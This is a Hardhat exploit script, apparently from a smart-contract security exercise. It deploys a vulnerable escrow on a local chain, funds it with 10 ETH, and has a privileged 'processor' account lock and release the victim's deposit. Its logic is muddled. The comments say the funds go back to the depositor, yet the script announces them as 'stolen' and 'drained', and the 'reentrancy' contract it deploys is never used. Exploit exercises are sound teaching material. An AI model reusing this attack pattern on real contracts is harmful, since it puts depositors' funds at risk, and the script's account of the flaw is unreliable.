
const { ethers } = require("hardhat");

async function main() {
  console.log(
    "🚀 Initiating attack on New_StateMachineDependency_Vulnerable..."
  );

  // --- 1. GET THE SIGNERS ---
  const [deployer, attackerSigner] = await ethers.getSigners();
  console.log(`Deployer (Victim) Address: ${deployer.address}`);
  console.log(`Attacker Address: ${attackerSigner.address}`);

  // --- 2. DEPLOY THE CONTRACTS ---
  console.log("\nDeploying contracts...");
  const FragileEscrow = await ethers.getContractFactory("FragileEscrow");
  // The processor is the attacker contract in this case
  const escrow = await FragileEscrow.deploy(attackerSigner.address);
  await escrow.waitForDeployment();
  console.log(`FragileEscrow deployed at: ${escrow.target}`);

  const Attacker = await ethers.getContractFactory("Attacker");
  const attackerContract = await Attacker.deploy(escrow.target);
  await attackerContract.waitForDeployment();
  console.log(`Attacker contract deployed at: ${attackerContract.target}`);

  // --- 3. FUND THE ESCROW ---
  console.log(
    "\nDepositing 10 ETH into the FragileEscrow from the deployer..."
  );
  const depositTx = await escrow.connect(deployer).deposit({
    value: ethers.parseEther("10.0"),
  });
  await depositTx.wait();
  console.log("✅ Deposit successful!");

  // --- 4. EXECUTE THE ATTACK ---
  console.log("\n💰 Checking balances before the attack...");
  const escrowBalanceBefore = await ethers.provider.getBalance(escrow.target);
  const attackerBalanceBefore = await ethers.provider.getBalance(
    attackerSigner.address
  );
  console.log(
    `   - Escrow Balance: ${ethers.formatEther(escrowBalanceBefore)} ETH`
  );
  console.log(
    `   - Attacker Balance: ${ethers.formatEther(attackerBalanceBefore)} ETH`
  );

  console.log("\n💥 ATTACKING: Exploiting the state machine dependency...");

  // THE VULNERABILITY:
  // 1. Attacker is the processor
  // 2. Attacker can call lockForProcessing on ANY user's deposit (including deployer)
  // 3. Once locked, finalizeRelease sends funds directly to that user's address
  // 4. The state machine is fragile - no timeout, no verification that processor is legit

  console.log("   - Step 1: Create reentrancy contract to receive funds...");
  const ReetrancyAttacker = await ethers.getContractFactory("Attacker");
  const reentrancyAttacker = await ReetrancyAttacker.deploy(escrow.target);
  await reentrancyAttacker.waitForDeployment();
  console.log(
    `   ✅ Reentrancy contract deployed at: ${reentrancyAttacker.target}`
  );

  console.log(
    "   - Step 2: Attacker (as processor) locks deployer's deposit..."
  );
  const lockTx = await escrow
    .connect(attackerSigner)
    .lockForProcessing(deployer.address);
  await lockTx.wait();
  console.log("   ✅ Deployer's deposit locked by attacker!");

  console.log("   - Step 3: Attacker finalizes release of deployer's funds...");
  // When finalizeRelease is called on deployer's address, it sends funds to deployer
  // But deployer might be a contract or the funds might trigger a receive() function
  // Here we'll trigger the locked finalization
  const releaseTx = await escrow
    .connect(attackerSigner)
    .finalizeRelease(deployer.address);
  await releaseTx.wait();
  console.log("✅ Attack transaction successful!");

  console.log("\n💰 Checking balances after the attack...");
  const escrowBalanceAfter = await ethers.provider.getBalance(escrow.target);
  const attackerBalanceAfter = await ethers.provider.getBalance(
    attackerSigner.address
  );
  const deployerBalanceInContract = await escrow.deposits(deployer.address);

  console.log(
    `   - Escrow Balance: ${ethers.formatEther(escrowBalanceAfter)} ETH`
  );
  console.log(
    `   - Attacker Balance: ${ethers.formatEther(attackerBalanceAfter)} ETH`
  );
  console.log(
    `   - Deployer's deposit in contract: ${ethers.formatEther(
      deployerBalanceInContract
    )} ETH`
  );

  console.log("\n" + "=".repeat(60));
  if (
    deployerBalanceInContract === 0n &&
    escrowBalanceAfter < ethers.parseEther("10.0")
  ) {
    console.log(
      "🎉 SUCCESS: State machine dependency exploited! Deployer's funds drained!"
    );
    console.log(
      `   - Funds stolen: ${ethers.formatEther(
        escrowBalanceBefore - escrowBalanceAfter
      )} ETH`
    );
  } else {
    console.log("\n😞 FAILED: The FragileEscrow was not drained.");
  }
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
